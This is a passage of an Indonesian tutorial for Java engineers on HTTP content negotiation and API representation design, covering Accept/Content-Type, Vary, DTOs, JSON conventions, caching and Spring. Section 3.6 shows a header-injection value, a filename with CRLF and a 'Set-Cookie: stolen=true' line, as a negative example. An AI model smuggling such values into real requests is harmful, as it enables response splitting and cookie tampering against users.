# learn-http-for-web-backend-perspective-part-008.md

# Part 008 — Content Negotiation and Representation Design

> Seri: **HTTP for Web/Backend Perspective**  
> Target pembaca: **Java software engineer** yang ingin memahami HTTP backend secara production-grade.  
> Fokus part ini: memahami bahwa backend tidak hanya mengirim JSON, tetapi memilih, menerima, memvalidasi, menegosiasikan, dan menstabilkan **representation contract**.

---

## 0. Posisi Part Ini dalam Seri

Pada part sebelumnya kita sudah membahas:

- HTTP semantics dari sisi server.
- Request lifecycle dari socket sampai controller.
- Method semantics.
- Status code sebagai state contract.
- Header sebagai control plane.
- Body dan message framing.
- URI, routing, dan resource modeling.

Sekarang kita masuk ke lapisan yang sering dianggap sederhana, padahal sangat menentukan kualitas API jangka panjang:

> **Bagaimana sebuah resource direpresentasikan kepada client dan bagaimana server memilih/menerima format representation tersebut.**

Banyak backend engineer menyederhanakan topik ini menjadi:

```text
API kita return JSON.
Request body juga JSON.
Selesai.
```

Itu cukup untuk CRUD kecil, tetapi tidak cukup untuk sistem production yang punya:

- banyak client;
- versi API panjang;
- backward compatibility;
- audit requirement;
- bulk export;
- report PDF/CSV;
- file upload;
- mobile client lama;
- machine-to-machine integration;
- regulatory record;
- security and privacy constraints;
- multi-language response;
- compression;
- schema evolution.

Part ini membangun mental model bahwa **representation adalah kontrak eksternal**, bukan sekadar object Java yang otomatis diserialisasi.

---

## 1. Core Mental Model

### 1.1 Resource bukan representation

Dalam HTTP, **resource** adalah target konseptual yang diidentifikasi oleh URI.

Contoh:

```http
GET /cases/C-2026-00091
```

Resource-nya adalah:

```text
case C-2026-00091
```

Tetapi response yang dikirim server bukan “resource itu sendiri”. Server mengirim **representation** dari resource tersebut.

Contoh representation JSON:

```json
{
  "caseId": "C-2026-00091",
  "status": "UNDER_REVIEW",
  "assignedUnit": "Enforcement Division",
  "createdAt": "2026-06-18T09:30:00+07:00"
}
```

Representation lain bisa berupa CSV:

```csv
caseId,status,assignedUnit,createdAt
C-2026-00091,UNDER_REVIEW,Enforcement Division,2026-06-18T09:30:00+07:00
```

Atau PDF report:

```text
Case Report C-2026-00091.pdf
```

Resource sama. Representation berbeda.

### 1.2 Backend memilih selected representation

Saat client melakukan request, server bisa memilih representation berdasarkan:

- URI;
- method;
- `Accept`;
- `Accept-Language`;
- `Accept-Encoding`;
- authentication/authorization;
- tenant;
- API version;
- query parameter;
- server policy;
- availability of renderer/exporter.

Contoh:

```http
GET /cases/C-2026-00091
Accept: application/json
```

Response:

```http
HTTP/1.1 200 OK
Content-Type: application/json

{ ... }
```

Client lain:

```http
GET /cases/C-2026-00091
Accept: application/pdf
```

Response:

```http
HTTP/1.1 200 OK
Content-Type: application/pdf
Content-Disposition: inline; filename="case-C-2026-00091.pdf"

<binary pdf bytes>
```

Inilah **selected representation**: representation konkret yang dipilih server untuk request tersebut.

### 1.3 Representation contract lebih stabil daripada entity internal

Kesalahan umum Java backend:

```java
@GetMapping("/cases/{id}")
public CaseEntity getCase(@PathVariable String id) {
    return repository.findById(id).orElseThrow();
}
```

Masalahnya:

- field database bocor ke API;
- lazy relation bisa terserialisasi tanpa sadar;
- internal enum bocor;
- sensitive fields bisa ikut keluar;
- schema API berubah saat entity berubah;
- circular reference bisa terjadi;
- migration database menjadi breaking API change;
- API tidak punya bahasa domain yang stabil.

Top 1% backend engineer memperlakukan representation sebagai **public contract**.

Biasanya ada boundary eksplisit:

```text
HTTP Request Body
      ↓
Request DTO / Command DTO
      ↓
Application Service
      ↓
Domain Model / Persistence Model
      ↓
Response DTO / Representation Model
      ↓
HTTP Response Body
```

Entity internal bukan representation publik.

---

## 2. Content Negotiation: Apa yang Dinegosiasikan?

Content negotiation adalah proses memilih bentuk representation yang paling cocok antara preferensi client dan kemampuan server.

Ada beberapa dimensi utama.

### 2.1 Media type negotiation

Dikendalikan terutama oleh:

```http
Accept: application/json
```

Server menjawab dengan:

```http
Content-Type: application/json
```

Contoh media type:

```text
application/json
application/problem+json
application/xml
text/csv
text/plain
application/pdf
application/octet-stream
application/ndjson
multipart/form-data
application/x-www-form-urlencoded
application/merge-patch+json
application/json-patch+json
```

### 2.2 Request content type

Untuk request body, client menyatakan format body menggunakan:

```http
Content-Type: application/json
```

Ini bukan preferensi. Ini deklarasi:

> “Body yang saya kirim menggunakan format ini.”

Jika server tidak mendukung format tersebut, response yang tepat biasanya:

```http
HTTP/1.1 415 Unsupported Media Type
```

### 2.3 Response content preference

Untuk response, client menyatakan format yang diinginkan menggunakan:

```http
Accept: application/json
```

Jika server tidak dapat menghasilkan representation yang acceptable, response yang tepat bisa:

```http
HTTP/1.1 406 Not Acceptable
```

Namun banyak API memilih fallback ke JSON default, terutama jika API contract memang hanya mendukung JSON. Ini boleh saja, tetapi harus konsisten dan terdokumentasi.

### 2.4 Language negotiation

Client bisa mengirim:

```http
Accept-Language: id-ID, en-US;q=0.8
```

Server bisa menjawab:

```http
Content-Language: id-ID
```

Ini relevan untuk:

- localized error message;
- PDF report;
- notification template;
- human-readable labels;
- regulatory document output;
- downloadable report.

Tetapi hati-hati:

> Machine-readable fields harus tetap stabil, tidak boleh berubah hanya karena bahasa.

Buruk:

```json
{
  "status": "Sedang Ditinjau"
}
```

Lebih baik:

```json
{
  "status": "UNDER_REVIEW",
  "statusLabel": "Sedang Ditinjau"
}
```

`status` stabil untuk mesin. `statusLabel` boleh localized.

### 2.5 Encoding negotiation

Client bisa mengirim:

```http
Accept-Encoding: gzip, br
```

Server bisa menjawab:

```http
Content-Encoding: gzip
```

Ini bukan media type. Ini encoding/compression layer.

Representation tetap misalnya JSON, tetapi bytes dikompresi.

```http
Content-Type: application/json
Content-Encoding: gzip
```

Artinya:

```text
representation metadata: JSON
wire bytes: gzip-compressed JSON
```

### 2.6 Version negotiation

Versi API kadang dinegosiasikan lewat:

```http
Accept: application/vnd.company.case+json;version=2
```

Atau:

```http
X-API-Version: 2
```

Atau path:

```http
GET /v2/cases/C-2026-00091
```

Versioning akan dibahas mendalam di part khusus, tetapi di sini penting memahami bahwa versioning sering melekat ke representation contract.

---

## 3. Header Penting dalam Representation Design

### 3.1 `Content-Type`

`Content-Type` menjelaskan media type body.

Response JSON:

```http
Content-Type: application/json
```

Problem Details:

```http
Content-Type: application/problem+json
```

CSV:

```http
Content-Type: text/csv; charset=utf-8
```

PDF:

```http
Content-Type: application/pdf
```

Binary unknown:

```http
Content-Type: application/octet-stream
```

Rule penting:

> Jangan mengirim body tanpa `Content-Type` jika body perlu dipahami client.

### 3.2 `Accept`

`Accept` menjelaskan media type response yang dapat diterima client.

Contoh:

```http
Accept: application/json
```

Multiple preference:

```http
Accept: application/json, application/xml;q=0.8, */*;q=0.1
```

`q` adalah quality value. Semakin tinggi, semakin diprioritaskan.

Interpretasi:

```text
Saya paling ingin JSON.
XML masih bisa.
Apa pun juga masih bisa, tapi prioritas rendah.
```

### 3.3 `Accept-Language`

Contoh:

```http
Accept-Language: id-ID, en-US;q=0.8
```

Backend tidak wajib selalu mengikuti. Tetapi jika localization didukung, response sebaiknya menyatakan:

```http
Content-Language: id-ID
```

### 3.4 `Accept-Encoding`

Contoh:

```http
Accept-Encoding: gzip, br
```

Response:

```http
Content-Encoding: gzip
```

Backend harus memperhatikan:

- compression CPU cost;
- response size threshold;
- binary format yang sudah compressed;
- sensitive response and compression side-channel risk;
- proxy/CDN compression;
- double compression.

### 3.5 `Vary`

`Vary` sangat penting untuk caching.

Jika response berbeda berdasarkan `Accept`, server harus memberi sinyal:

```http
Vary: Accept
```

Jika response berbeda berdasarkan language:

```http
Vary: Accept-Language
```

Jika response berbeda berdasarkan origin:

```http
Vary: Origin
```

Tanpa `Vary`, shared cache/CDN bisa mengembalikan representation yang salah ke client lain.

Contoh bug:

1. Client A minta PDF.
2. CDN cache `/cases/C-1` sebagai PDF.
3. Client B minta JSON.
4. CDN mengembalikan PDF karena tidak tahu response bervariasi berdasarkan `Accept`.

Solusi:

```http
Vary: Accept
```

### 3.6 `Content-Disposition`

Untuk download file:

```http
Content-Disposition: attachment; filename="case-report.pdf"
```

Untuk tampil inline:

```http
Content-Disposition: inline; filename="case-report.pdf"
```

Backend harus menghindari header injection pada filename.

Buruk:

```text
filename="report.pdf\r\nSet-Cookie: stolen=true"
```

File name dari user harus dinormalisasi.

---

## 4. `Content-Type` vs `Accept`: Kesalahan Konseptual Umum

Banyak bug API berasal dari tertukarnya dua header ini.

### 4.1 `Content-Type` = format body yang dikirim

Request:

```http
POST /cases
Content-Type: application/json

{
  "subject": "Unauthorized activity"
}
```

Artinya:

```text
Request body adalah JSON.
```

### 4.2 `Accept` = format response yang diinginkan

Request:

```http
POST /cases
Content-Type: application/json
Accept: application/problem+json

{ invalid json maybe }
```

Artinya:

```text
Saya mengirim JSON.
Kalau ada response, saya bisa menerima problem+json.
```

### 4.3 Decision rule

| Situation | Header | Error jika unsupported |
|---|---:|---:|
| Client mengirim body format yang server tidak bisa parse | `Content-Type` | `415 Unsupported Media Type` |
| Client meminta response format yang server tidak bisa hasilkan | `Accept` | `406 Not Acceptable` |
| Client mengirim body malformed sesuai content type | body parser | `400 Bad Request` |
| Client mengirim JSON valid tapi semantic invalid | validation layer | `400` atau `422`, sesuai policy |

Contoh:

```http
POST /cases
Content-Type: application/xml
Accept: application/json
```

Jika endpoint hanya menerima JSON:

```http
HTTP/1.1 415 Unsupported Media Type
Content-Type: application/problem+json

{
  "type": "https://api.example.com/problems/unsupported-media-type",
  "title": "Unsupported Media Type",
  "status": 415,
  "detail": "This endpoint accepts application/json."
}
```

Contoh lain:

```http
GET /cases/C-1
Accept: application/pdf
```

Jika endpoint hanya menghasilkan JSON:

```http
HTTP/1.1 406 Not Acceptable
Content-Type: application/problem+json

{
  "type": "https://api.example.com/problems/not-acceptable",
  "title": "Not Acceptable",
  "status": 406,
  "detail": "This endpoint can produce application/json."
}
```

---

## 5. Media Type sebagai Contract Boundary

### 5.1 JSON bukan sekadar string

`application/json` berarti body mengikuti JSON grammar. Tetapi contract API lebih dari itu.

Contract sebenarnya mencakup:

- field apa yang ada;
- field mana required;
- tipe data;
- nullability;
- enum value;
- numeric precision;
- date/time format;
- timezone expectation;
- nested object;
- array semantics;
- unknown field handling;
- error shape;
- semantic rules.

Contoh:

```json
{
  "caseId": "C-2026-00091",
  "status": "UNDER_REVIEW",
  "priority": "HIGH",
  "createdAt": "2026-06-18T09:30:00+07:00",
  "links": {
    "self": "/cases/C-2026-00091"
  }
}
```

Ini bukan hanya JSON. Ini adalah representation contract.

### 5.2 Vendor-specific media type

Kadang API memakai vendor-specific media type:

```http
Accept: application/vnd.acme.case+json
```

Atau dengan version:

```http
Accept: application/vnd.acme.case.v2+json
```

Keuntungan:

- version melekat pada representation;
- path tidak perlu berubah;
- client eksplisit meminta schema tertentu;
- beberapa representation bisa hidup berdampingan.

Kekurangan:

- tooling lebih rumit;
- developer kurang familiar;
- gateway/documentation kadang perlu konfigurasi ekstra;
- debugging lebih sulit dibanding `/v1` path.

### 5.3 Problem Details media type

Untuk error response, API modern sering memakai:

```http
Content-Type: application/problem+json
```

Contoh:

```json
{
  "type": "https://api.example.com/problems/validation-error",
  "title": "Validation failed",
  "status": 400,
  "detail": "One or more fields are invalid.",
  "instance": "/cases/submissions/REQ-19291",
  "errors": [
    {
      "field": "subject",
      "code": "required",
      "message": "subject is required"
    }
  ]
}
```

Poin penting:

- error representation juga contract;
- jangan return HTML error page untuk JSON API;
- jangan return stack trace;
- jangan ubah shape error sembarangan;
- error code internal harus stabil.

---

## 6. Representation Design untuk Backend API

### 6.1 Response DTO bukan database entity

Layering yang sehat:

```text
Database Row / Document
        ↓
Persistence Entity
        ↓
Domain Model / Aggregate / Projection
        ↓
Application Result
        ↓
HTTP Response DTO
        ↓
Serialized Representation
```

Contoh entity internal:

```java
@Entity
class CaseEntity {
    @Id
    private UUID id;

    private String publicCaseNumber;
    private String internalRiskScore;
    private String assignedInvestigatorUserId;
    private String encryptedRespondentTaxId;
    private CaseStatus status;
    private Instant createdAt;
    private Instant updatedAt;

    @Version
    private long version;
}
```

Response DTO:

```java
public record CaseResponse(
    String caseId,
    String status,
    String statusLabel,
    String createdAt,
    String updatedAt,
    Links links
) {}
```

Tidak semua data internal keluar.

### 6.2 Request DTO bukan command domain langsung

Request:

```json
{
  "subject": "Unauthorized activity",
  "description": "Possible violation observed",
  "respondentId": "R-10291"
}
```

Request DTO:

```java
public record CreateCaseRequest(
    @NotBlank String subject,
    @NotBlank String description,
    @NotBlank String respondentId
) {}
```

Application command:

```java
public record CreateCaseCommand(
    String subject,
    String description,
    RespondentId respondentId,
    UserId submittedBy,
    TenantId tenantId,
    Instant requestedAt,
    IdempotencyKey idempotencyKey
) {}
```

Request DTO berasal dari client. Command berasal dari application boundary dan memasukkan context server-side.

### 6.3 Representation harus punya stability policy

Field dalam response bisa dikategorikan:

| Field type | Stability expectation |
|---|---|
| Identifier | Sangat stabil |
| Status enum | Stabil dan versioned |
| Timestamp | Stabil formatnya |
| Human label | Boleh berubah/localized |
| Links | Stabil relation name |
| Internal diagnostic | Biasanya tidak public |
| Derived summary | Perlu definisi jelas |
| Experimental field | Harus ditandai |

Contoh field buruk:

```json
{
  "days": 3
}
```

Apa artinya?

- days since created?
- business days?
- calendar days?
- SLA remaining?
- timezone siapa?

Lebih baik:

```json
{
  "sla": {
    "startedAt": "2026-06-18T09:30:00+07:00",
    "dueAt": "2026-06-25T17:00:00+07:00",
    "remainingBusinessDays": 5,
    "calendar": "ID-JK-BUSINESS-DAYS"
  }
}
```

### 6.4 Jangan expose internal enum mentah tanpa policy

Internal enum:

```java
enum CaseStatus {
    NEW,
    L1_REVIEW,
    L2_REVIEW,
    LEGAL_PENDING,
    CLOSED_ARCHIVED
}
```

Public status mungkin:

```json
{
  "status": "UNDER_REVIEW"
}
```

Mapping internal ke public bisa menjaga API tetap stabil walau workflow internal berubah.

Contoh:

| Internal status | Public status |
|---|---|
| `NEW` | `SUBMITTED` |
| `L1_REVIEW` | `UNDER_REVIEW` |
| `L2_REVIEW` | `UNDER_REVIEW` |
| `LEGAL_PENDING` | `UNDER_REVIEW` |
| `CLOSED_ARCHIVED` | `CLOSED` |

Ini penting untuk workflow-heavy system.

### 6.5 Representation boleh berorientasi query/projection

Tidak semua response harus mencerminkan aggregate domain penuh.

List endpoint:

```http
GET /cases?status=UNDER_REVIEW
```

Response bisa berupa summary projection:

```json
{
  "items": [
    {
      "caseId": "C-2026-00091",
      "status": "UNDER_REVIEW",
      "priority": "HIGH",
      "assignedUnit": "Enforcement Division",
      "updatedAt": "2026-06-18T11:45:00+07:00"
    }
  ],
  "page": {
    "limit": 50,
    "nextCursor": "eyJvZmZzZXQiOjUwfQ"
  }
}
```

Detail endpoint:

```http
GET /cases/C-2026-00091
```

Response bisa lebih kaya.

Jangan memaksakan satu DTO untuk semua endpoint.

---

## 7. Designing JSON Representation Carefully

### 7.1 Field naming

Pilih satu convention dan konsisten:

```json
{
  "caseId": "C-1",
  "createdAt": "2026-06-18T09:30:00+07:00"
}
```

Atau:

```json
{
  "case_id": "C-1",
  "created_at": "2026-06-18T09:30:00+07:00"
}
```

Jangan campur:

```json
{
  "case_id": "C-1",
  "createdAt": "2026-06-18T09:30:00+07:00"
}
```

Dalam ekosistem Java/Spring, `camelCase` sering natural untuk DTO. Dalam beberapa API publik, `snake_case` juga umum. Yang penting: konsisten dan terdokumentasi.

### 7.2 Null vs missing vs empty

Ini sangat penting.

```json
{
  "assignedOfficer": null
}
```

Bisa berarti:

```text
Field diketahui, tetapi belum ada assigned officer.
```

Jika field tidak dikirim:

```json
{
  "caseId": "C-1"
}
```

Bisa berarti:

```text
Field tidak termasuk dalam representation ini.
```

Empty string:

```json
{
  "assignedOfficer": ""
}
```

Bisa berarti data buruk, bukan “tidak ada”.

Policy yang baik:

| Situation | Recommended representation |
|---|---|
| Value unknown/not applicable | `null` jika field memang bagian dari schema |
| Field not selected/included | omit field |
| Empty collection | `[]` |
| Empty object | `{}` jika meaningful |
| Empty text | hindari kecuali memang meaningful |

Contoh:

```json
{
  "caseId": "C-1",
  "assignedOfficer": null,
  "tags": []
}
```

### 7.3 Date/time format

Gunakan format eksplisit dan timezone-aware.

Baik:

```json
{
  "createdAt": "2026-06-18T09:30:00+07:00"
}
```

Baik juga untuk server canonical UTC:

```json
{
  "createdAt": "2026-06-18T02:30:00Z"
}
```

Buruk:

```json
{
  "createdAt": "18/06/2026 09:30"
}
```

Masalah:

- ambiguous locale;
- timezone tidak jelas;
- parser fragile;
- sorting lexicographic bisa gagal;
- integration client harus menebak.

Untuk regulatory system, waktu harus jelas:

- event occurred time;
- received time;
- recorded time;
- effective time;
- deadline time;
- timezone;
- clock source.

Contoh lebih defensible:

```json
{
  "submittedAt": "2026-06-18T09:30:00+07:00",
  "receivedAt": "2026-06-18T02:30:03Z",
  "recordedBy": "system-gateway-01"
}
```

### 7.4 Numeric precision

JSON number tidak membedakan integer, decimal, long, BigDecimal secara eksplisit.

Hati-hati dengan:

- monetary value;
- large ID;
- tax ID;
- long sequence;
- risk score precision;
- JavaScript number precision.

Buruk:

```json
{
  "amount": 1000000.25,
  "currency": "IDR"
}
```

Bisa diterima dalam beberapa context, tetapi untuk money sering lebih aman:

```json
{
  "amount": {
    "currency": "IDR",
    "minorUnits": 100000025
  }
}
```

Atau decimal string:

```json
{
  "amount": {
    "currency": "IDR",
    "value": "1000000.25"
  }
}
```

Large ID sebaiknya string:

```json
{
  "caseId": "9007199254740993123"
}
```

Jangan:

```json
{
  "caseId": 9007199254740993123
}
```

### 7.5 Boolean naming

Baik:

```json
{
  "isOverdue": true,
  "canEscalate": false,
  "requiresSupervisorApproval": true
}
```

Tapi pastikan semantics tidak ambiguous.

Buruk:

```json
{
  "active": true
}
```

Apa artinya active?

- not deleted?
- currently open?
- allowed to process?
- user enabled?
- rule effective?

Lebih baik:

```json
{
  "caseLifecycleStatus": "OPEN",
  "isArchived": false,
  "canReceiveNewEvidence": true
}
```

### 7.6 Enum evolution

Enum adalah salah satu sumber breaking change paling sering.

Jika response punya:

```json
{
  "status": "UNDER_REVIEW"
}
```

Lalu server menambah:

```json
{
  "status": "LEGAL_ESCALATION_PENDING"
}
```

Client lama bisa rusak jika enum parsing strict.

Policy:

- dokumentasikan enum bisa bertambah;
- client harus handle unknown;
- server menjaga semantic category jika perlu;
- pertimbangkan `statusCategory`.

Contoh:

```json
{
  "status": "LEGAL_ESCALATION_PENDING",
  "statusCategory": "IN_PROGRESS"
}
```

Client lama bisa memakai category jika status detail belum dikenal.

---

## 8. Request Representation Design

### 8.1 Request body harus command-oriented, bukan entity dump

Buruk:

```json
{
  "id": null,
  "status": "NEW",
  "createdAt": null,
  "updatedAt": null,
  "createdBy": null,
  "assignedOfficer": null,
  "internalRiskScore": null,
  "subject": "Unauthorized activity"
}
```

Ini terlihat seperti entity database.

Lebih baik:

```json
{
  "subject": "Unauthorized activity",
  "description": "Possible violation observed at branch office.",
  "respondentId": "R-10291",
  "evidenceRefs": ["EV-TEMP-901"]
}
```

Request body harus mewakili intensi client, bukan struktur persistence.

### 8.2 Server-owned fields tidak boleh dipercaya dari request

Field berikut biasanya server-owned:

- `id`;
- `createdAt`;
- `createdBy`;
- `updatedAt`;
- `version`;
- `status` awal;
- `tenantId`;
- `roles`;
- `riskScore`;
- `approvalState`;
- `auditMetadata`.

Jika client mengirim:

```json
{
  "subject": "Unauthorized activity",
  "status": "APPROVED",
  "createdBy": "admin"
}
```

Server harus:

- reject unknown/forbidden fields; atau
- ignore dengan logging/security signal.

Untuk high-integrity API, lebih baik reject field berbahaya.

### 8.3 Unknown field policy

Ada tiga pilihan:

| Policy | Behavior | Cocok untuk |
|---|---|---|
| Strict reject | unknown field -> error | regulated/write APIs |
| Lenient ignore | unknown field diabaikan | backward-compatible public API |
| Capture extension | unknown field masuk `extensions` | extensible platform/API |

Strict reject contoh:

```json
{
  "type": "https://api.example.com/problems/unknown-field",
  "title": "Unknown field",
  "status": 400,
  "detail": "Request contains unsupported field: createdBy"
}
```

Trade-off:

- strict membantu menangkap typo dan mass assignment;
- lenient membantu forward compatibility;
- extension cocok jika memang ada governance extension.

Untuk write API yang sensitif, strict biasanya lebih aman.

### 8.4 Partial update request representation

PATCH harus punya format jelas.

#### JSON Merge Patch

Media type:

```http
Content-Type: application/merge-patch+json
```

Body:

```json
{
  "priority": "HIGH",
  "assignedUnit": null
}
```

Dalam merge patch, `null` biasanya berarti remove/set null. Ini harus dipahami benar.

#### JSON Patch

Media type:

```http
Content-Type: application/json-patch+json
```

Body:

```json
[
  { "op": "replace", "path": "/priority", "value": "HIGH" },
  { "op": "remove", "path": "/assignedUnit" }
]
```

Lebih eksplisit, tetapi lebih kompleks.

#### Domain-specific patch/command

Untuk workflow-heavy domain, sering lebih baik:

```http
POST /cases/C-1/assignment-changes
Content-Type: application/json
```

```json
{
  "assignedUnit": "LEGAL_REVIEW",
  "reason": "Potential litigation risk"
}
```

Ini lebih auditable daripada generic patch.

---

## 9. Response Representation Patterns

### 9.1 Single resource representation

```json
{
  "caseId": "C-2026-00091",
  "status": "UNDER_REVIEW",
  "priority": "HIGH",
  "createdAt": "2026-06-18T09:30:00+07:00",
  "updatedAt": "2026-06-18T10:10:00+07:00",
  "links": {
    "self": "/cases/C-2026-00091",
    "evidence": "/cases/C-2026-00091/evidence",
    "timeline": "/cases/C-2026-00091/timeline"
  }
}
```

### 9.2 Collection representation

Jangan return array mentah jika butuh pagination/metadata.

Kurang evolvable:

```json
[
  { "caseId": "C-1" },
  { "caseId": "C-2" }
]
```

Lebih evolvable:

```json
{
  "items": [
    { "caseId": "C-1" },
    { "caseId": "C-2" }
  ],
  "page": {
    "limit": 50,
    "nextCursor": "eyJjcmVhdGVkQXQiOiIyMDI2LTA2LTE4In0"
  },
  "links": {
    "self": "/cases?status=UNDER_REVIEW&limit=50",
    "next": "/cases?status=UNDER_REVIEW&limit=50&cursor=eyJjcmVhdGVkQXQiOiIyMDI2LTA2LTE4In0"
  }
}
```

### 9.3 Command result representation

Untuk `POST /cases`:

```http
HTTP/1.1 201 Created
Location: /cases/C-2026-00091
Content-Type: application/json
```

```json
{
  "caseId": "C-2026-00091",
  "status": "SUBMITTED",
  "links": {
    "self": "/cases/C-2026-00091"
  }
}
```

Untuk asynchronous processing:

```http
HTTP/1.1 202 Accepted
Location: /case-submissions/SUB-2026-771
Content-Type: application/json
```

```json
{
  "submissionId": "SUB-2026-771",
  "status": "PENDING_PROCESSING",
  "links": {
    "self": "/case-submissions/SUB-2026-771",
    "result": "/case-submissions/SUB-2026-771/result"
  }
}
```

### 9.4 Minimal vs expanded representation

Basic:

```http
GET /cases/C-1
```

```json
{
  "caseId": "C-1",
  "status": "UNDER_REVIEW",
  "assignedUnitId": "U-9"
}
```

Expanded:

```http
GET /cases/C-1?include=assignedUnit,evidenceSummary
```

```json
{
  "caseId": "C-1",
  "status": "UNDER_REVIEW",
  "assignedUnit": {
    "unitId": "U-9",
    "name": "Legal Review"
  },
  "evidenceSummary": {
    "count": 12,
    "latestUploadedAt": "2026-06-18T10:00:00+07:00"
  }
}
```

Peringatan:

- `include` harus dibatasi allowlist;
- jangan membuka arbitrary object graph;
- perhatikan authorization per included object;
- perhatikan N+1 query;
- perhatikan cache key dan `Vary`/query.

---

## 10. Representation and Authorization

Representation bisa berbeda berdasarkan siapa yang meminta.

Investigator:

```json
{
  "caseId": "C-1",
  "status": "UNDER_REVIEW",
  "respondent": {
    "respondentId": "R-1",
    "name": "PT Example"
  },
  "internalRiskScore": "HIGH"
}
```

External respondent:

```json
{
  "caseId": "C-1",
  "status": "UNDER_REVIEW",
  "respondent": {
    "respondentId": "R-1",
    "name": "PT Example"
  }
}
```

Same resource. Different representation due to authorization.

Risiko:

- cache leakage;
- over-fetching sensitive field;
- DTO reuse across roles;
- object mapper accidentally serializes hidden field;
- GraphQL/include-like API leaks nested data.

Rule:

> Authorization tidak hanya menentukan apakah resource boleh diakses, tetapi juga field/action/representation mana yang boleh terlihat.

Jika representation berbeda per user, caching harus hati-hati:

```http
Cache-Control: private, no-store
```

Atau minimal:

```http
Vary: Authorization
```

Namun untuk data sensitif, `no-store` sering lebih aman.

---

## 11. Representation and Caching

Caching bekerja pada representation, bukan resource abstrak.

Jika server mengirim:

```http
GET /cases/C-1
Accept: application/json
```

Response:

```http
HTTP/1.1 200 OK
Content-Type: application/json
ETag: "case-C-1-v7-json"
Cache-Control: private, max-age=60
Vary: Accept
```

ETag tersebut memvalidasi selected representation JSON.

Jika PDF berbeda:

```http
GET /cases/C-1
Accept: application/pdf
```

ETag bisa berbeda:

```http
ETag: "case-C-1-v7-pdf"
Vary: Accept
```

Poin penting:

- JSON dan PDF untuk resource sama bisa punya validator berbeda.
- Localized response harus memperhitungkan language.
- User-specific response tidak boleh masuk shared cache sembarangan.
- `Vary` menentukan cache key behavior.

---

## 12. Java/Spring Content Negotiation Mental Model

### 12.1 Spring MVC high-level flow

Simplified:

```text
HTTP request
   ↓
DispatcherServlet
   ↓
HandlerMapping selects controller
   ↓
HandlerAdapter invokes method
   ↓
Argument resolver reads parameters/body
   ↓
HttpMessageConverter deserializes request body
   ↓
Controller returns object/ResponseEntity
   ↓
HttpMessageConverter serializes response body
   ↓
HTTP response
```

`HttpMessageConverter` adalah komponen penting untuk representation.

Contoh converters:

- JSON via Jackson;
- String;
- byte array;
- resource/file;
- form data;
- XML jika configured.

### 12.2 `consumes` and `produces`

Controller bisa menyatakan request/response media type.

```java
@RestController
@RequestMapping("/cases")
class CaseController {

    @PostMapping(
        consumes = MediaType.APPLICATION_JSON_VALUE,
        produces = MediaType.APPLICATION_JSON_VALUE
    )
    ResponseEntity<CaseResponse> createCase(@Valid @RequestBody CreateCaseRequest request) {
        CaseResponse response = service.create(request);
        URI location = URI.create("/cases/" + response.caseId());
        return ResponseEntity.created(location).body(response);
    }
}
```

Makna:

- `consumes`: endpoint menerima request body JSON.
- `produces`: endpoint menghasilkan response JSON.

Jika client mengirim `Content-Type: application/xml`, Spring dapat menghasilkan 415 jika XML tidak didukung untuk endpoint tersebut.

Jika client mengirim `Accept: application/xml`, sementara endpoint hanya `produces application/json`, Spring dapat menghasilkan 406.

### 12.3 Multiple representation dari endpoint sama

```java
@GetMapping(value = "/{caseId}", produces = MediaType.APPLICATION_JSON_VALUE)
CaseResponse getCaseJson(@PathVariable String caseId) {
    return service.getCase(caseId);
}

@GetMapping(value = "/{caseId}", produces = MediaType.APPLICATION_PDF_VALUE)
ResponseEntity<byte[]> getCasePdf(@PathVariable String caseId) {
    byte[] pdf = reportService.renderCasePdf(caseId);
    return ResponseEntity.ok()
        .contentType(MediaType.APPLICATION_PDF)
        .header(HttpHeaders.CONTENT_DISPOSITION, "inline; filename=case-" + caseId + ".pdf")
        .body(pdf);
}
```

Request:

```http
GET /cases/C-1
Accept: application/json
```

akan memilih JSON handler.

Request:

```http
GET /cases/C-1
Accept: application/pdf
```

akan memilih PDF handler.

### 12.4 DTO serialization with Jackson

Contoh record DTO:

```java
public record CaseResponse(
    String caseId,
    String status,
    String statusLabel,
    OffsetDateTime createdAt,
    OffsetDateTime updatedAt,
    Map<String, String> links
) {}
```

Pertimbangan Jackson:

- date/time module;
- timezone serialization;
- null inclusion;
- unknown property handling;
- enum serialization;
- property naming strategy;
- sensitive field annotation;
- custom serializer/deserializer.

Contoh konfigurasi unknown property strict untuk request DTO:

```java
@Configuration
class JacksonConfig {
    @Bean
    ObjectMapper objectMapper() {
        return JsonMapper.builder()
            .findAndAddModules()
            .disable(SerializationFeature.WRITE_DATES_AS_TIMESTAMPS)
            .enable(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES)
            .build();
    }
}
```

Namun hati-hati: global strict unknown property bisa memengaruhi semua endpoint. Dalam sistem besar, policy bisa perlu per API group.

### 12.5 `@JsonView` caution

Jackson `@JsonView` bisa digunakan untuk representation berbeda, tetapi bisa membuat contract tersebar di entity/DTO.

Contoh:

```java
class CaseDto {
    @JsonView(Public.class)
    String caseId;

    @JsonView(Internal.class)
    String internalRiskScore;
}
```

Masalah potensial:

- sulit diaudit;
- field leak jika view salah;
- policy authorization bercampur dengan serialization;
- test coverage harus kuat.

Untuk high-security API, sering lebih jelas membuat DTO terpisah:

```java
PublicCaseResponse
InternalCaseResponse
SupervisorCaseResponse
```

### 12.6 Avoid returning `Map<String,Object>` casually

Buruk:

```java
@GetMapping("/cases/{id}")
Map<String, Object> getCase(@PathVariable String id) {
    return Map.of(
        "caseId", id,
        "status", "UNDER_REVIEW"
    );
}
```

Kadang berguna untuk prototyping, tetapi untuk API contract serius:

- tidak type-safe;
- dokumentasi buruk;
- refactoring risk;
- validation sulit;
- schema generation buruk;
- test contract sulit.

Lebih baik DTO eksplisit.

---

## 13. WebFlux Representation Handling

WebFlux memakai codec, bukan `HttpMessageConverter` klasik.

Flow sederhana:

```text
HTTP request
   ↓
Reactor Netty / Servlet reactive adapter
   ↓
HandlerMapping
   ↓
HandlerAdapter
   ↓
HttpMessageReader reads body into Mono/Flux
   ↓
Handler returns Mono/Flux
   ↓
HttpMessageWriter writes response
```

Contoh:

```java
@RestController
@RequestMapping("/cases")
class ReactiveCaseController {

    @PostMapping(
        consumes = MediaType.APPLICATION_JSON_VALUE,
        produces = MediaType.APPLICATION_JSON_VALUE
    )
    Mono<ResponseEntity<CaseResponse>> create(@Valid @RequestBody Mono<CreateCaseRequest> requestMono) {
        return requestMono
            .flatMap(service::create)
            .map(response -> ResponseEntity
                .created(URI.create("/cases/" + response.caseId()))
                .body(response));
    }
}
```

Streaming NDJSON:

```java
@GetMapping(value = "/events", produces = MediaType.APPLICATION_NDJSON_VALUE)
Flux<CaseEventResponse> streamEvents() {
    return eventService.streamEvents();
}
